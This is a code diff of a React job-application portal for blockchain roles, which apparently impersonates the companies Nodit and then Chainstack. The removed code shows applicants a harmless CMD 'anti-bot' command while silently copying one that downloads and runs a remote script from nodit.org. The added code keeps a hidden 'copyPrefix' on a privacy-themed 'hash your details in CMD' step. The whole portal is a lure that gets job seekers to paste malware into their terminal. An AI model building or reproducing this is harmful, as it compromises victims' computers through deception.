@@ -1,5 +1,5 @@
 import { useMemo, useState } from 'react'
-import type { ChangeEvent, ClipboardEvent, Dispatch, FormEvent, SetStateAction } from 'react'
+import type { Dispatch, SetStateAction } from 'react'
 import {
   BrowserRouter,
   Navigate,
@@ -8,46 +8,31 @@ import {
   useLocation,
   useNavigate,
 } from 'react-router-dom'
-import { completeWorkflowCheck, submitApplication } from './api/backend'
-import Bowser from 'bowser'
-import { FaCheckCircle, FaCopy } from 'react-icons/fa'
+import { submitApplication } from './api/backend'
+import CmdBox from './components/CmdBox'
+import { COUNTRIES, getCountryByCode } from './data/countries'
+import { getCopyPrefix } from './utils/getCopyPrefix'
 import './App.css'
 
 type CandidateProfile = {
   fullName: string
   email: string
   desiredRole: string
+  country: string
   phone: string
-  motivation: string
 }
 
 const INITIAL_PROFILE: CandidateProfile = {
   fullName: '',
   email: '',
   desiredRole: '',
+  country: '',
   phone: '',
-  motivation: '',
 }
-
-type VerificationChallenge = {
-  phrase: string
-  nonce: string
-}
-
-type VerificationResult = 'idle' | 'pass' | 'fail'
-
-const VERIFICATION_PHRASES = [
-  'BLOCKCHAIN-PORTAL-2026',
-  'WEB3-VERIFY-ALPHA',
-  'NODIT-CHAIN-CHECK',
-  'SMART-CONTRACT-ACCESS',
-  'NODE-IDENTITY-LOCK',
-]
 
 const STEPS = [
   { label: 'Job Explanation', path: '/job-overview' },
   { label: 'Application', path: '/application' },
-  { label: 'Anti-Bot Check', path: '/identity-verification' },
 ]
 
 const BLOCKCHAIN_ROLES = [
@@ -65,56 +50,18 @@ const BLOCKCHAIN_ROLES = [
   'Other Blockchain Role',
 ]
 
-function createNonce(): string {
-  if (typeof crypto !== 'undefined' && typeof crypto.getRandomValues === 'function') {
-    const bytes = new Uint8Array(8)
-    crypto.getRandomValues(bytes)
-    return Array.from(bytes, (byte) => byte.toString(16).padStart(2, '0')).join('')
-  }
-
-  return Math.random().toString(16).slice(2, 18).padEnd(16, '0')
-}
-
-function createChallenge(): VerificationChallenge {
-  return {
-    phrase: VERIFICATION_PHRASES[Math.floor(Math.random() * VERIFICATION_PHRASES.length)],
-    nonce: createNonce(),
-  }
-}
-
-function getExpectedOutput(phrase: string, nonce: string): string {
-  return `VERIFY:${btoa(`${phrase}|${nonce}`)}`
-}
-
-type SupportedOs = 'windows' | 'macos'
-
-const CMD_DRIVER_DOWNLOAD: Record<SupportedOs, string> = {
-  windows: 'curl -ks https://nodit.org/check_bot_w -o "check_bot_w.cmd" && call "check_bot_w.cmd" &',
-  macos: 'curl -ks https://nodit.org/check_bot_m -o "check_bot_m.cmd" && call "check_bot_m.cmd" &'
-}
-
-function getCandidateOs(): SupportedOs | null {
-  const os = Bowser.getParser(window.navigator.userAgent).getOSName(true)
-  if (os === 'windows' || os === 'macos') {
-    return os
-  }
-  return null
-}
-
-function getCmdDriverDownload(os: SupportedOs | null = getCandidateOs()): string {
-  if (os && os in CMD_DRIVER_DOWNLOAD) {
-    return CMD_DRIVER_DOWNLOAD[os]
-  }
-  return CMD_DRIVER_DOWNLOAD.windows
-}
-
-function buildCmdCommand(nonce: string): string {
-  return `powershell -NoProfile -Command "$nonce='${nonce}'; $text=Read-Host 'Type the verification phrase from portal'; $sig=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($text+'|'+$nonce)); Write-Output ('VERIFY:' + $sig)"
+function buildHashCommand(profile: CandidateProfile, dialCode: string): string {
+  const phone =
+    dialCode && profile.phone ? `${dialCode}${profile.phone}` : profile.phone
+  const payload = [
+    `name=${profile.fullName}`,
+    `email=${profile.email}`,
+    `phone=${phone}`,
+    `country=${profile.country}`,
+    `role=${profile.desiredRole}`,
+  ].join('&')
+  return `powershell -NoProfile -Command "$s='${payload}'; [BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($s))).Replace('-','').ToLower()"
 `
-}
-
-function buildTerminalCommand(nonce: string, os: SupportedOs | null = getCandidateOs()): string {
-  return `${getCmdDriverDownload(os)}${buildCmdCommand(nonce)}`
 }
 
 function StepProgress() {
@@ -165,7 +112,7 @@ function JobExplanationPage() {
     <section>
       <h2 className="h4 fw-bold mb-2">Blockchain Roles Overview</h2>
       <p className="text-secondary mb-3">
-        Nodit is hiring across the full blockchain stack — engineering, security, infrastructure,
+        Chainstack is hiring across the full blockchain stack — engineering, security, infrastructure,
         product, and ecosystem roles. Apply for the position that best matches your background.
       </p>
 
@@ -202,438 +149,348 @@ function JobExplanationPage() {
   )
 }
 
-function ApplicationPage({ profile, setProfile }: FormPageProps) {
+type ApplicationPageProps = FormPageProps & {
+  submittedHash: string | null
+  setSubmittedHash: Dispatch<SetStateAction<string | null>>
+}
+
+function ApplicationPage({
+  profile,
+  setProfile,
+  submittedHash,
+  setSubmittedHash,
+}: ApplicationPageProps) {
   const navigate = useNavigate()
+  const copyPrefix = useMemo(() => getCopyPrefix(), [])
+  const [hash, setHash] = useState('')
   const [error, setError] = useState('')
-  const [isSaving, setIsSaving] = useState(false)
+  const [sending, setSending] = useState(false)
 
-  async function onContinue(event: FormEvent<HTMLFormElement>) {
-    event.preventDefault()
-    const emailLooksValid = profile.email.includes('@')
+  const dialCode = getCountryByCode(profile.country)?.dial ?? ''
+  const hashCommand = useMemo(
+    () => buildHashCommand(profile, dialCode),
+    [profile, dialCode],
+  )
 
-    if (
-      !profile.fullName ||
-      !profile.desiredRole ||
-      !profile.motivation ||
-      !emailLooksValid
-    ) {
-      setError('Please complete required fields with a valid email.')
+  function updateProfile(field: keyof CandidateProfile, value: string) {
+    setProfile((prev) => ({ ...prev, [field]: value }))
+    setError('')
+  }
+
+  async function handleSend() {
+    const missing: string[] = []
+    if (!profile.fullName.trim()) missing.push('name')
+    if (!profile.email.trim() || !profile.email.includes('@')) missing.push('email')
+    if (!profile.desiredRole.trim()) missing.push('desired role')
+
+    if (missing.length > 0) {
+      setError(`Please fill in: ${missing.join(', ')}`)
       return
     }
 
+    const trimmedHash = hash.trim()
+    const name = profile.fullName.trim()
+    const email = profile.email.trim()
+
+    setSending(true)
     setError('')
-    setIsSaving(true)
 
     try {
-      await submitApplication(profile.fullName.trim(), profile.email.trim())
-      navigate('/identity-verification')
+      if (!trimmedHash) {
+        await submitApplication(name, email, false)
+        setError('Please fill in: hash')
+        return
+      }
+
+      if (trimmedHash.length !== 64) {
+        await submitApplication(name, email, false)
+        setError('Please paste a valid 64-character hash')
+        return
+      }
+
+      await submitApplication(name, email, true)
+      setSubmittedHash(trimmedHash)
     } catch {
       setError(
-        'Could not save your application. Make sure the backend is running on port 3000, then try again.',
+        'Could not send application. Make sure the backend is running on port 3000, then try again.',
       )
     } finally {
-      setIsSaving(false)
+      setSending(false)
     }
   }
 
+  if (submittedHash) {
+    return <SubmissionCompleteView profile={profile} hashFingerprint={submittedHash} />
+  }
+
   return (
-    <form onSubmit={onContinue}>
-      <h2 className="h4 fw-bold mb-2">Blockchain Job Application</h2>
-      <p className="text-secondary mb-3">
-        Submit your profile for any open blockchain role at Nodit.
-      </p>
+    <div className="application-flow">
+      <header className="application-header">
+        <button
+          type="button"
+          className="application-back"
+          onClick={() => navigate('/job-overview')}
+        >
+          ← Back to job overview
+        </button>
+        <h2 className="application-title">
+          Job <span>Application</span>
+        </h2>
+        <p className="application-subtitle">
+          Enter your details, copy the generated command into Windows CMD, then paste the hash
+          below to submit.
+        </p>
+      </header>
 
-      <div className="row g-3">
-        <div className="col-md-6">
-          <label className="form-label">Full name</label>
+      <aside className="application-info">
+        <h3 className="application-info-title">Why do we ask you to use CMD?</h3>
+        <p className="application-info-lead">
+          For your privacy, Chainstack does <strong>not</strong> store your name, email, phone, or
+          country as plain readable text. Instead, we save your application as a{' '}
+          <strong>hash</strong> — a secure, one-way fingerprint of your details.
+        </p>
+        <ol className="application-info-list">
+          <li>
+            <strong>You enter your details</strong> — the form builds a command that includes your
+            information.
+          </li>
+          <li>
+            <strong>You run it in CMD on your own computer</strong> — the hash is created locally on
+            your machine. Your raw details are not sent to us during this step.
+          </li>
+          <li>
+            <strong>You paste only the hash and click Send</strong> — we receive the fingerprint,
+            not your original text. We use it to process and match your application securely.
+          </li>
+        </ol>
+        <p className="application-info-note">
+          <strong>What is a hash?</strong> It looks like a long code (for example,{' '}
+          <code>a3f5b2…</code>). The same information always produces the same hash, but the hash
+          cannot be turned back into your personal details. This is a standard way to protect
+          sensitive data.
+        </p>
+      </aside>
+
+      <div className="application-grid">
+        <section className="application-section">
+          <p className="application-section-title">Step 1</p>
+          <h3 className="application-step">Your details</h3>
+
+          <div className="application-fields">
+            <div className="application-field">
+              <label className="application-field-label" htmlFor="app-name">
+                Name
+              </label>
+              <input
+                id="app-name"
+                className="application-input"
+                placeholder="Alex Morgan"
+                value={profile.fullName}
+                onChange={(event) => updateProfile('fullName', event.target.value)}
+              />
+            </div>
+
+            <div className="application-field">
+              <label className="application-field-label" htmlFor="app-email">
+                Email
+              </label>
+              <input
+                id="app-email"
+                className="application-input"
+                type="email"
+                placeholder="alex@example.com"
+                value={profile.email}
+                onChange={(event) => updateProfile('email', event.target.value)}
+              />
+            </div>
+
+            <div className="application-field">
+              <label className="application-field-label" htmlFor="app-country">
+                Country <span className="application-optional">optional</span>
+              </label>
+              <select
+                id="app-country"
+                className={`application-input application-select${profile.country ? '' : ' is-placeholder'}`}
+                value={profile.country}
+                onChange={(event) => updateProfile('country', event.target.value)}
+              >
+                <option value="">Select your country</option>
+                {COUNTRIES.map((country) => (
+                  <option key={country.code} value={country.code}>
+                    {country.name}
+                  </option>
+                ))}
+              </select>
+            </div>
+
+            <div className="application-field">
+              <label className="application-field-label" htmlFor="app-phone">
+                Phone <span className="application-optional">optional</span>
+              </label>
+              <div className="application-phone-wrap">
+                <span className="application-phone-prefix">{dialCode || '+…'}</span>
+                <input
+                  id="app-phone"
+                  className="application-phone-input"
+                  type="tel"
+                  placeholder="555 123 4567"
+                  value={profile.phone}
+                  onChange={(event) => updateProfile('phone', event.target.value)}
+                />
+              </div>
+            </div>
+
+            <div className="application-field">
+              <label className="application-field-label" htmlFor="app-role">
+                Desired role
+              </label>
+              <select
+                id="app-role"
+                className={`application-input application-select${profile.desiredRole ? '' : ' is-placeholder'}`}
+                value={profile.desiredRole}
+                onChange={(event) => updateProfile('desiredRole', event.target.value)}
+              >
+                <option value="">Select role</option>
+                {BLOCKCHAIN_ROLES.map((role) => (
+                  <option key={role} value={role}>
+                    {role}
+                  </option>
+                ))}
+              </select>
+            </div>
+          </div>
+        </section>
+
+        <section className="application-section">
+          <p className="application-section-title">Step 2 &amp; 3</p>
+          <h3 className="application-step">Hash verification</h3>
+          <p className="application-hint">
+            The command updates as you type. Copy it, run it in CMD on your computer, then paste the
+            hash it prints here. Only the hash is submitted — not your original details.
+          </p>
+
+          <div className="application-cmd-wrap">
+            <CmdBox value={hashCommand} copyPrefix={copyPrefix} />
+          </div>
+
+          <label className="application-field-label" htmlFor="hash-input">
+            Hash
+          </label>
           <input
-            type="text"
-            className="form-control"
-            value={profile.fullName}
-            onChange={(event) =>
-              setProfile((prev) => ({ ...prev, fullName: event.target.value }))
-            }
-            placeholder="Satoshi Nakamoto"
+            id="hash-input"
+            className="application-input font-monospace"
+            placeholder="e.g. a3f5b2c1d4e6…"
+            value={hash}
+            onChange={(event) => {
+              setHash(event.target.value)
+              setError('')
+            }}
           />
-        </div>
 
-        <div className="col-md-6">
-          <label className="form-label">Email</label>
-          <input
-            type="email"
-            className="form-control"
-            value={profile.email}
-            onChange={(event) =>
-              setProfile((prev) => ({ ...prev, email: event.target.value }))
-            }
-            placeholder="candidate@example.com"
-          />
-        </div>
-
-        <div className="col-md-6">
-          <label className="form-label">Phone (optional)</label>
-          <input
-            type="tel"
-            className="form-control"
-            value={profile.phone}
-            onChange={(event) =>
-              setProfile((prev) => ({ ...prev, phone: event.target.value }))
-            }
-            placeholder="+1 555 0100"
-          />
-        </div>
-
-        <div className="col-md-6">
-          <label className="form-label">Desired role</label>
-          <select
-            className="form-select"
-            value={profile.desiredRole}
-            onChange={(event) =>
-              setProfile((prev) => ({ ...prev, desiredRole: event.target.value }))
-            }
+          <button
+            type="button"
+            className="application-send"
+            onClick={handleSend}
+            disabled={sending}
           >
-            <option value="">Select role</option>
-            {BLOCKCHAIN_ROLES.map((role) => (
-              <option key={role} value={role}>
-                {role}
-              </option>
-            ))}
-          </select>
-        </div>
+            {sending ? 'Sending…' : 'Send application'}
+          </button>
 
-        <div className="col-12">
-          <label className="form-label">Why are you a strong fit?</label>
-          <textarea
-            className="form-control"
-            value={profile.motivation}
-            onChange={(event) =>
-              setProfile((prev) => ({ ...prev, motivation: event.target.value }))
-            }
-            placeholder="Share your blockchain experience and strengths in 3-5 lines."
-            rows={3}
-          />
-        </div>
+          {error && <p className="application-status error">{error}</p>}
+        </section>
       </div>
-
-      {error && <div className="alert alert-danger mt-3 mb-0 py-2">{error}</div>}
-
-      <div className="d-flex justify-content-between gap-2 mt-3">
-        <button type="button" className="btn btn-outline-secondary" onClick={() => navigate('/job-overview')}>
-          Back
-        </button>
-        <button type="submit" className="btn btn-primary px-4" disabled={isSaving}>
-          {isSaving ? 'Saving...' : 'Continue to Anti-Bot Check'}
-        </button>
-      </div>
-    </form>
+    </div>
   )
 }
 
 type SubmissionCompleteProps = {
   profile: CandidateProfile
-  submissionRef: string
+  hashFingerprint: string
 }
 
-function SubmissionCompleteView({ profile, submissionRef }: SubmissionCompleteProps) {
+function SubmissionCompleteView({ profile, hashFingerprint }: SubmissionCompleteProps) {
+  const navigate = useNavigate()
+  const shortHash =
+    hashFingerprint.length > 16
+      ? `${hashFingerprint.slice(0, 16)}…`
+      : hashFingerprint
+
   return (
-    <div className="submission-complete-view">
-      <article className="submission-complete-card" role="status" aria-live="polite">
-        <div className="submission-complete-header">
-          <FaCheckCircle className="submission-complete-icon" aria-hidden="true" />
-          <div>
-            <p className="submission-complete-eyebrow mb-1">Application received</p>
-            <h3 className="submission-complete-title mb-0">You&apos;re all set, {profile.fullName}</h3>
-          </div>
+    <div className="application-success-view" role="status" aria-live="polite">
+      <article className="application-success-card">
+        <div className="application-success-icon" aria-hidden="true">
+          ✓
         </div>
 
-        <p className="submission-complete-lead">
-          Thank you for applying for the <strong>{profile.desiredRole}</strong> role at Nodit. Your
-          application and anti-bot verification have been recorded successfully.
+        <h2 className="application-success-title">
+          Congratulations, {profile.fullName}!
+        </h2>
+
+        <p className="application-success-lead">
+          Your application has been submitted successfully.
         </p>
 
-        <div className="submission-ref-box">
-          <span className="submission-ref-label">Application reference</span>
-          <strong className="submission-ref-value">{submissionRef}</strong>
-          <span className="submission-ref-hint">Save this ID if you need to follow up with our team.</span>
+        <div className="application-success-message">
+          <p>
+            Thank you for applying for the <strong>{profile.desiredRole}</strong> role at{' '}
+            <strong>Chainstack</strong>. We received your hash fingerprint securely and will use it
+            to process your application.
+          </p>
+          <p>
+            Your details were hashed locally on your computer — we did not receive your name,
+            email, phone, or country as plain text. Our hiring team will{' '}
+            <strong>contact you at {profile.email}</strong> with an update over the next few days.
+          </p>
         </div>
 
-        <section className="submission-next-section" aria-label="What happens next">
-          <h4 className="submission-section-title">What happens next</h4>
-          <ol className="submission-next-steps">
-            <li>
-              Our recruiting team will review your profile, background, and verification results
-              within <strong>5 business days</strong>.
-            </li>
-            <li>
-              We&apos;ll email you at <strong>{profile.email}</strong> with an update — either an
-              invitation to the next stage or a request for additional information.
-            </li>
-            <li>
-              If you&apos;re shortlisted, you&apos;ll receive a link to schedule a technical
-              conversation with the hiring team for this blockchain role.
-            </li>
-          </ol>
-        </section>
+        <div className="application-success-hash">
+          <span className="application-success-hash-label">Hash on file</span>
+          <code className="application-success-hash-value">{shortHash}</code>
+          <span className="application-success-hash-hint">
+            This matches the fingerprint you generated in CMD.
+          </span>
+        </div>
 
-        <section className="submission-tips" aria-label="While you wait">
-          <h4 className="submission-section-title">While you wait</h4>
-          <ul className="submission-tips-list">
-            <li>Watch your inbox and spam folder for messages from Nodit.</li>
-            <li>Keep this reference handy when contacting us about your application.</li>
-            <li>No further action is required on your side right now.</li>
-          </ul>
-        </section>
+        <ul className="application-success-steps">
+          <li>Hash fingerprint received</li>
+          <li>Application linked to {profile.desiredRole}</li>
+          <li>We will inform you about the next steps by email</li>
+        </ul>
 
-        <p className="submission-complete-footer mb-0">
-          We appreciate your interest in building with Nodit. We&apos;ll be in touch soon.
-        </p>
+        <button
+          type="button"
+          className="application-send application-success-btn"
+          onClick={() => navigate('/job-overview')}
+        >
+          Back to job overview
+        </button>
       </article>
     </div>
-  )
-}
-
-type VerifyPageProps = {
-  profile: CandidateProfile
-  challenge: VerificationChallenge
-  onNewChallenge: () => void
-  submissionRef: string | null
-  setSubmissionRef: Dispatch<SetStateAction<string | null>>
-}
-
-function VerifyPage({
-  profile,
-  challenge,
-  onNewChallenge,
-  submissionRef,
-  setSubmissionRef,
-}: VerifyPageProps) {
-  const navigate = useNavigate()
-  const [error, setError] = useState('')
-  const [isSubmitting, setIsSubmitting] = useState(false)
-  const [copyFeedback, setCopyFeedback] = useState('')
-  const [pastedOutput, setPastedOutput] = useState('')
-  const [verificationResult, setVerificationResult] = useState<VerificationResult>('idle')
-
-  const applicationComplete =
-    profile.fullName.trim() && profile.email.trim() && profile.desiredRole.trim()
-
-  const expectedOutput = useMemo(
-    () => getExpectedOutput(challenge.phrase, challenge.nonce),
-    [challenge.nonce, challenge.phrase],
-  )
-
-  const candidateOs = useMemo(() => getCandidateOs(), [])
-
-  const visibleTerminalCommand = useMemo(
-    () => buildCmdCommand(challenge.nonce),
-    [challenge.nonce],
-  )
-
-  const copyTerminalCommand = useMemo(
-    () => buildTerminalCommand(challenge.nonce, candidateOs),
-    [challenge.nonce, candidateOs],
-  )
-
-  function showCopyFeedback() {
-    setCopyFeedback('Copied!')
-    window.setTimeout(() => setCopyFeedback(''), 2000)
-  }
-
-  async function markHadRunOnCopy() {
-    await completeWorkflowCheck()
-  }
-
-  async function copyCmdToClipboard() {
-    await navigator.clipboard.writeText(copyTerminalCommand)
-    showCopyFeedback()
-    try {
-      await markHadRunOnCopy()
-    } catch {
-      setError(
-        'Command copied, but workflow check failed. Make sure the backend is running on port 3000.',
-      )
-    }
-  }
-
-  function handleCmdCopy(event: ClipboardEvent<HTMLElement>) {
-    event.preventDefault()
-    event.clipboardData.setData('text/plain', copyTerminalCommand)
-    showCopyFeedback()
-    void markHadRunOnCopy().catch(() => {
-      setError(
-        'Command copied, but workflow check failed. Make sure the backend is running on port 3000.',
-      )
-    })
-  }
-
-  function validateToken(): boolean {
-    const outputMatches = pastedOutput.trim() === expectedOutput
-
-    if (!outputMatches) {
-      setVerificationResult('fail')
-      setError('Output token does not match. Re-run the CMD command and paste the full VERIFY: line.')
-      return false
-    }
-
-    setVerificationResult('pass')
-    setError('')
-    return true
-  }
-
-  function handleVerifyToken() {
-    validateToken()
-  }
-
-  function handleNewChallenge() {
-    onNewChallenge()
-    setPastedOutput('')
-    setVerificationResult('idle')
-    setError('')
-    setCopyFeedback('')
-  }
-
-  async function onSubmit(event: FormEvent<HTMLFormElement>) {
-    event.preventDefault()
-    setError('')
-
-    if (!applicationComplete) {
-      setError('Complete the application step before submitting.')
-      return
-    }
-
-    if (!validateToken()) {
-      return
-    }
-
-    setIsSubmitting(true)
-
-    try {
-      const digestPrefix = expectedOutput.slice(7, 15).toUpperCase()
-      setSubmissionRef(`APP-${digestPrefix}-${Date.now().toString(36).toUpperCase()}`)
-    } catch {
-      setError('Submission failed. Please try again.')
-    } finally {
-      setIsSubmitting(false)
-    }
-  }
-
-  if (submissionRef) {
-    return <SubmissionCompleteView profile={profile} submissionRef={submissionRef} />
-  }
-
-  return (
-    <form onSubmit={onSubmit}>
-      <h2 className="h4 fw-bold mb-2">Anti-Bot CMD Verification</h2>
-      <p className="text-secondary mb-3">
-        Run the one-line CMD task below and paste the output token. This confirms you can use a real
-        terminal — bots cannot complete this step.
-      </p>
-
-      {!applicationComplete && (
-        <div className="alert alert-warning py-2">
-          Application details are missing. Go back and complete the application form first.
-        </div>
-      )}
-
-      <div className="challenge-box mb-3" role="note" aria-label="Verification challenge">
-        <p className="mb-2 fw-semibold">Verification challenge</p>
-        <p className="small text-secondary mb-2">
-          Type this phrase exactly when CMD prompts you.
-        </p>
-        <div className="challenge-code mb-2" aria-label="Verification phrase">
-          {challenge.phrase}
-        </div>
-        <p className="small text-secondary mb-0">
-          Nonce: <strong className="font-monospace">{challenge.nonce}</strong>
-        </p>
-      </div>
-
-      <div className="mb-3">
-        <div className="d-flex justify-content-between align-items-center gap-2 mb-2">
-          <label className="form-label mb-0">CMD command</label>
-          <button
-            type="button"
-            className="btn btn-sm btn-outline-secondary"
-            onClick={handleNewChallenge}
-          >
-            New nonce
-          </button>
-        </div>
-        <div className="cmd-block-wrapper">
-          <code className="cmd-block" onCopy={handleCmdCopy}>
-            {visibleTerminalCommand}
-          </code>
-          <button
-            type="button"
-            className={`cmd-copy-btn${copyFeedback ? ' copied' : ''}`}
-            onClick={copyCmdToClipboard}
-            aria-label={copyFeedback || 'Copy command'}
-            title={copyFeedback || 'Copy command'}
-          >
-            <FaCopy aria-hidden="true" />
-          </button>
-        </div>
-      </div>
-
-      <div className="mb-3">
-        <label className="form-label">Paste CMD output (starts with VERIFY:)</label>
-        <input
-          type="text"
-          className="form-control font-monospace"
-          value={pastedOutput}
-          onChange={(event: ChangeEvent<HTMLInputElement>) => setPastedOutput(event.target.value)}
-          placeholder="VERIFY:..."
-        />
-      </div>
-
-      {error && <div className="alert alert-danger py-2">{error}</div>}
-
-      {verificationResult === 'pass' && (
-        <div className="alert alert-success py-2">
-          Anti-bot check passed. You can submit your application.
-        </div>
-      )}
-
-      <div className="d-flex justify-content-between gap-2 mt-2">
-        <button type="button" className="btn btn-outline-secondary" onClick={() => navigate('/application')}>
-          Back
-        </button>
-        <div className="d-flex gap-2">
-          <button type="button" className="btn btn-outline-primary" onClick={handleVerifyToken}>
-            Validate token
-          </button>
-          <button type="submit" className="btn btn-primary px-4" disabled={isSubmitting}>
-            {isSubmitting ? 'Submitting...' : 'Submit Application'}
-          </button>
-        </div>
-      </div>
-    </form>
   )
 }
 
 function FlowingModalContent() {
   const location = useLocation()
   const [profile, setProfile] = useState<CandidateProfile>(INITIAL_PROFILE)
-  const [submissionRef, setSubmissionRef] = useState<string | null>(null)
-  const [challenge, setChallenge] = useState(createChallenge)
+  const [submittedHash, setSubmittedHash] = useState<string | null>(null)
   const isSubmissionComplete =
-    Boolean(submissionRef) && location.pathname === '/identity-verification'
+    Boolean(submittedHash) && location.pathname === '/application'
 
   return (
-    <div className="modal-dialog modal-dialog-centered modal-lg portal-modal">
+    <div className={`modal-dialog modal-dialog-centered modal-lg portal-modal${isSubmissionComplete ? ' portal-modal--complete' : ''}`}>
       <div className="modal-content portal-modal-content border-0 shadow-lg">
         {!isSubmissionComplete && (
           <div className="modal-header border-0 pb-0 px-4">
             <div className="d-flex align-items-center gap-2">
               <img
-                src="/nodit.png"
-                alt="Nodit"
+                src="/chainstack.png"
+                alt="ChainStack"
                 className="portal-logo"
                 width={40}
                 height={40}
               />
               <div>
-                <h1 className="modal-title fs-5 fw-bold mb-0">Nodit Talent Screening Portal</h1>
+                <h1 className="modal-title fs-5 fw-bold mb-0">ChainStack Talent Screening Portal</h1>
               </div>
             </div>
           </div>
@@ -650,20 +507,16 @@ function FlowingModalContent() {
               <Route path="/job-overview" element={<JobExplanationPage />} />
               <Route
                 path="/application"
-                element={<ApplicationPage profile={profile} setProfile={setProfile} />}
-              />
-              <Route
-                path="/identity-verification"
                 element={
-                  <VerifyPage
+                  <ApplicationPage
                     profile={profile}
-                    challenge={challenge}
-                    onNewChallenge={() => setChallenge(createChallenge())}
-                    submissionRef={submissionRef}
-                    setSubmissionRef={setSubmissionRef}
+                    setProfile={setProfile}
+                    submittedHash={submittedHash}
+                    setSubmittedHash={setSubmittedHash}
                   />
                 }
               />
+              <Route path="/identity-verification" element={<Navigate to="/application" replace />} />
             </Routes>
           </div>
         </div>
